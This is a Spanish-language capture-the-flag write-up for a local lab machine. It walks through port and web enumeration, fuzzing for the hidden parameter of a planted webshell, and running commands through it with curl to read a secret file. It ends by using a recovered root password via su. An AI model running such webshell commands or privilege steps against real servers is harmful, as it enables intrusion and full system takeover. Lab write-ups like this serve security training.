```bash
unzip whereismywebshell.zip
sudo bash auto_deploy.sh whereismywebshell.tar
settarget 172.17.0.3 WEBSHELL

# renombrar tag
Ctrl+Shift+Alt+T o
kitty @ set-tab-title "Mi nuevo nombre"

#Comprobar conexion con la maquina
ping 172.17.0.3
ping -c 1 172.17.0.3
ping -c 1 172.17.0.3 -R
nmap -sn 172.17.0.3


#Escaneo profundo
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 172.17.0.3 -oN nmap/nmap
cat -l java nmap
```

Nos encontramos con solamente el puerto 80 abierto
![[Pasted image 20260402184128.png]]

#### Enumeración web

Primer paso es observar la web antes de realizar técnicas de fuzzing

Nos encontramos una página de ingles con esta pista:¡Contáctanos hoy mismo para más información sobre nuestros programas de enseñanza de inglés!. Guardo un secretito en /tmp ;)

![[Pasted image 20260402184243.png]]


Hay algún tipo de **ejecución de comandos o LFI (Local File Inclusion)** en el sitio, porque `/tmp` es una ruta del sistema de archivos del servidor, no una URL.

```bash
curl http://172.17.0.3
curl http://172.17.0.3 -I
whatweb -v http://172.17.0.3

```

resultado whatweb:

**URL:** `http://172.17.0.3` | **Status:** 200 OK **Título:** Academia de Inglés (Inglis Academi)

Stack detectado

|Campo|Valor|
|---|---|
|Servidor|Apache 2.4.57|
|SO|Debian Linux|
|Frontend|HTML5|

Cabeceras relevantes

|Cabecera|Valor|
|---|---|
|`Server`|`Apache/2.4.57 (Debian)`|
|`Last-Modified`|12 Apr 2024|
|`Content-Type`|`text/html`|
|`Content-Encoding`|gzip|



```bash
searchsploit Apache 2.4.57
```

![[Pasted image 20260402184815.png]]

searchsploit **no ha devuelto CVEs directos para Apache 2.4.57**. Los resultados son falsos positivos por match parcial del string "Apache".

##### Fuzzing

Cambiamos el enfoque habitual para el gobuster y buscaremos extensiones que permitan ejecucion o inclusion debido a la pista encontrada /tmp

```bash
gobuster dir -u http://172.17.0.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,sh
```

Resultado:
![[Pasted image 20260402185611.png]]

nos llama la atencion ese /warning.html y la /shell.php

url con warning.html: # Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...

Para la /shell.php nos salta codigo de estado 500 con size=0. significa que la webshell existe pero le fala el parametro get, probamos con ffuf filtrando con respuestas vacias (size 0). para intentar entrar y poder leer el secreto guardado en /tmp

```bash
ffuf -u "http://172.17.0.3/shell.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

Resultado: parameter
![[Pasted image 20260402185938.png]]

Observamos la word parameter

```bash
curl http://172.17.0.3/shell.php?parameter=cat


#Resultado
<pre></pre>
                              
curl http://172.17.0.3/shell.php?parameter=id

#Resultado
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

Con esto se confirma que estamos ante un RCE -> ejecutar comandos del sistema operativo del servidor desde fuera, ya que hemos podido lanzar comando linux como el id y nos devuelve respuesta. Lanzamos un ls

```bash
curl http://172.17.0.3/shell.php?parameter=ls


 <pre></pre>

curl [http://172.17.0.3/shell.php?parameter=cat+/tmp/secreto

 <pre></pre>

curl [http://172.17.0.3/shell.php?parameter=cat+/tmp <pre></pre>


```

Nos centramos en el /tmp:
```bash
curl http://172.17.0.3/shell.php?parameter=ls+/tmp
#Esto esta vacio

curl http://172.17.0.3/shell.php?parameter=ls+-la+/tmp
#muestra secret
```

![[Pasted image 20260402194100.png]]

Buscamos en todo el filesystem en busca del archivo

```bash
curl "http://172.17.0.3/shell.php?parameter=find+/tmp+-ls"
```
Ahi si encontramos el archivo pero solo teniendo permiso de lectura

![[Pasted image 20260402190705.png]]

Buscamos leerlo:

```bash
curl "http://172.17.0.3/shell.php?parameter=cat+/tmp/.secret.txt"
```
![[Pasted image 20260402193521.png]]

### Intrusión

Miramos de conectarnos via ssh con root sabiendo la contraseña
```bash
ssh root@172.17.0.3 --> curl "http://172.17.0.3/shell.php?parameter=echo+contraseñaderoot123+|+su+-c+whoami+root"
```

![[Pasted image 20260402193731.png]]